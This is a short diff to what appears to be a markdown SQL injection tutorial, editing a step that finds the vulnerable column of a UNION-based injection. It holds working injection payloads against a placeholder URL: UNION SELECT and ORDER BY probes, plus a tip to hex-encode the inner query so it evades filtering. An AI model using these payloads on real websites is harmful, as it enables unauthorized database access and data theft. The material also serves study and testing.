@@ -80,7 +80,7 @@
            - example,
              - if we get errors on 2nd column, (i.e. https://website.com/product/id?=23' UNION SELECT 1,0x3127,3--) then, we can perform our injection on that column like this,
              1. *Get the total number of columns:* https://website.com/product/id?=23' UNION SELECT 1,2' ORDER BY 10--,3-- ***(0xHEX the ORDER BY 10--)***
-             2. *Get the vulnerable column:* https://website.com/product/id?=23' UNION SELECT 1,2' UNION SELECT 1,2,3,4,5--,3-- ***(0xHEX the query)***
+             2. *Get the vulnerable column:* https://website.com/product/id?=23' UNION SELECT 1,2' UNION SELECT 1,2,3,4,5--,3-- ***(0xHEX the UNION SELECT 1,2,3,4,5--)***
              3. now, you got the point. 🙂
 
 ### 5) Exploit. (get the data from database).
